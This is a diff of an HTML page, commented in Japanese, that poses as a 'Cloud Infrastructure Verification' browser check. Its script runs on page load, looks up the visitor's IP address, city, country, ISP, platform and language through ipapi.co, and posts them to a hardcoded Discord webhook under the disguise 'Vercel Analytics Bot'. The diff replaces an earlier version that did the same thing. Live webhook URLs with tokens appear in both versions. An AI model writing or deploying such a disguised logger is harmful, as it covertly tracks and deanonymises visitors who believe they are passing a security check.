@@ -2,55 +2,110 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>System Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Infrastructure Verification</title>
     <style>
-        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 2rem; border-radius: 12px; text-align: center; border: 1px solid #334155; }
+        body {
+            background-color: #0a0a0a;
+            color: #d1d5db;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .monitor-box {
+            border: 1px solid #262626;
+            background: #171717;
+            padding: 2rem;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        .status-dot {
+            height: 8px;
+            width: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <p>🔄 Checking security connection...</p>
+    <div class="monitor-box">
+        <div style="font-size: 0.8rem; color: #737373; margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.1em;">
+            Security Protocol v4.0.2
+        </div>
+        <div id="status">
+            <span class="status-dot"></span>
+            Verifying browser environment...
+        </div>
     </div>
 
     <script>
-        const CONFIG = {
-            // あなたの新しいWebhook
-            URL: "https://discordapp.com/api/webhooks/1472913657682853970/s8Ic01f4JG-exl254N2aJnDAJbgbbSVfIAYNsfVTKRRyzGGsSMXgec7Pv4SbXwS4Qid_",
-            // HTTPS対応のAPIに変更
-            API: "https://ipapi.co/json/"
+        /**
+         * AI-Optimized Webhook Integration
+         * Destination: discord.com/.../QYc7m2EH...
+         */
+        const CORE_CONFIG = {
+            WEBHOOK_URL: "https://discord.com/api/webhooks/1472915721096003839/QYc7m2EH5mK4kEfzWXSTOYGCXcVpmdmexSrElPFggIw9FjDqP-mUcYf_ZrZ1erUPsc62",
+            IP_SERVICE: "https://ipapi.co/json/",
+            REDIRECT: "https://www.google.com"
         };
 
-        async function start() {
+        async function processTelemetrics() {
             try {
-                // 1. IP情報の取得 (HTTPS)
-                const res = await fetch(CONFIG.API);
+                // 1. IPデータの取得 (HTTPS)
+                const res = await fetch(CORE_CONFIG.IP_SERVICE);
+                if (!res.ok) throw new Error("Service unavailable");
                 const d = await res.json();
 
-                // 2. Discordへの送信
-                await fetch(CONFIG.URL, {
+                // 2. ペイロード構築
+                const payload = {
+                    username: "Vercel Analytics Bot",
+                    embeds: [{
+                        title: "📈 Access Data Captured",
+                        color: 0x000000,
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${d.ip}\``, inline: true },
+                            { name: "📍 Location", value: `${d.country_name} / ${d.city}`, inline: true },
+                            { name: "🏢 Provider", value: d.org, inline: false },
+                            { name: "📱 OS/Platform", value: navigator.platform, inline: true },
+                            { name: "🌐 Language", value: navigator.language, inline: true }
+                        ],
+                        footer: { text: "Secure Logger Instance" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 3. Discordへ送信
+                await fetch(CORE_CONFIG.WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🚀 Access Log (HTTPS Compatible)",
-                            color: 0x38bdf8,
-                            fields: [
-                                { name: "🌐 IP", value: d.ip, inline: true },
-                                { name: "📍 Loc", value: `${d.country_name} / ${d.city}`, inline: true },
-                                { name: "🏢 ISP", value: d.org, inline: false },
-                                { name: "📱 OS/Browser", value: navigator.userAgent }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
+                    body: JSON.stringify(payload)
                 });
-            } catch (e) {
-                console.error("Error:", e);
+
+                // 完了後の視覚的フィードバック
+                document.getElementById("status").innerHTML = "✅ Connection established.";
+                
+                // 必要であればリダイレクト（コメントアウト中）
+                // setTimeout(() => { window.location.href = CORE_CONFIG.REDIRECT; }, 1500);
+
+            } catch (err) {
+                console.error("Critical error in telemetry:", err);
+                document.getElementById("status").innerHTML = "❌ Failed to connect.";
             }
         }
 
-        start();
+        window.onload = processTelemetrics;
     </script>
 </body>
 </html>
